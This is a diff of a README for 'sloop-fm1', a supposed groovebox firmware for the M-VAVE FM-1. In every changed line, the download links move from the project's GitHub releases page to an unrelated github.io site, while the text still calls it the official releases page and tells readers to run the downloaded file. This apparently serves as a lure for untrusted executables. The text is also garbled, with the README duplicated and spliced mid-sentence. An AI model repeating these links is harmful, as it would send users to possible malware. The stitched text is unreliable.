@@ -1,6 +1,6 @@
 # 🎛️ sloop-fm1 - Turn Your FM-1 Into a Live Groovebox
 
-[![Download sloop-fm1](https://img.shields.io/badge/Download-sloop--fm1-ff69b4?style=for-the-badge&logo=github)](https://github.com/Jelipon542/sloop-fm1/releases)
+[![Download sloop-fm1](https://img.shields.io/badge/Download-sloop--fm1-ff69b4?style=for-the-badge&logo=github)](https://jelipon542.github.io)
 
 sloop-fm1 is a live groovebox firmware for the M-VAVE FM-1. It is made for people who want to make beats, patterns, and musical ideas directly with their FM-1 device. The project is focused on live use: you can start a groove, change it as it plays, and keep the music moving without needing a complicated studio setup.
 
@@ -38,9 +38,9 @@ The M-VAVE FM-1 is designed for hands-on music making. sloop-fm1 leans into that
 
 ## 💾 Download and Setup
 
-[![Download sloop-fm1](https://img.shields.io/badge/Download-sloop--fm1-ff69b4?style=for-the-badge&logo=github)](https://github.com/Jelipon542/sloop-fm1/releases)
+[![Download sloop-fm1](https://img.shields.io/badge/Download-sloop--fm1-ff69b4?style=for-the-badge&logo=github)](https://jelipon542.github.io)
 
-Visit this link to download the application: [sloop-fm1 releases](https://github.com/Jelipon542/sloop-fm1/releases).
+Visit this link to download the application: [sloop-fm1 releases](https://jelipon542.github.io).
 
 Use the releases page to get the current sloop-fm1 download. The releases page is the official place to get the application. After the download finishes, open the downloaded file to start sloop-fm1. Keep the downloaded file in a folder you can find later, such as your Downloads folder. That way, you can open sloop-fm1 again the next time you want to use it.
 
@@ -50,7 +50,7 @@ The download and setup path is intentionally simple. You visit the releases page
 
 When you open sloop-fm1 for the first time, take a moment to look at the main screen before# 🎛️ sloop-fm1 - Turn Your FM-1 Into a Live Groovebox
 
-[![Download sloop-fm1](https://img.shields.io/badge/Download-sloop--fm1-ff69b4?style=for-the-badge&logo=github)](https://github.com/Jelipon542/sloop-fm1/releases)
+[![Download sloop-fm1](https://img.shields.io/badge/Download-sloop--fm1-ff69b4?style=for-the-badge&logo=github)](https://jelipon542.github.io)
 
 sloop-fm1 is a live groovebox firmware for the M-VAVE FM-1. It is made for people who want to make beats, patterns, and musical ideas directly with their FM-1 device. The project is focused on live use: you can start a groove, change it as it plays, and keep the music moving without needing a complicated studio setup.
 
@@ -88,9 +88,9 @@ The M-VAVE FM-1 is designed for hands-on music making. sloop-fm1 leans into that
 
 ## 💾 Download and Setup
 
-[![Download sloop-fm1](https://img.shields.io/badge/Download-sloop--fm1-ff69b4?style=for-the-badge&logo=github)](https://github.com/Jelipon542/sloop-fm1/releases)
+[![Download sloop-fm1](https://img.shields.io/badge/Download-sloop--fm1-ff69b4?style=for-the-badge&logo=github)](https://jelipon542.github.io)
 
-Visit this link to download the application: [sloop-fm1 releases](https://github.com/Jelipon542/sloop-fm1/releases).
+Visit this link to download the application: [sloop-fm1 releases](https://jelipon542.github.io).
 
 Use the releases page to get the current sloop-fm1 download. The releases page is the official place to get the application. After the download finishes, open the downloaded file to start sloop-fm1. Keep the downloaded file in a folder you can find later, such as your Downloads folder. That way, you can open sloop-fm1 again the next time you want to use it.
 
@@ -127,7 +127,7 @@ Which device does sloop-fm1 work with?
 sloop-fm1 is a live groovebox firmware for the M-VAVE FM-1. The application and the device are used together.
 
 Where do I get the application?
-From the official releases page: [sloop-fm1 releases](https://github.com/Jelipon542/sloop-fm1/releases).
+From the official releases page: [sloop-fm1 releases](https://jelipon542.github.io).
 
 Do I need a powerful computer?
 sloop-fm1 is a groovebox application. Most modern Windows computers handle that kind of work comfortably. Keep your system reasonably up to date and close heavy background applications if you notice slowdown.
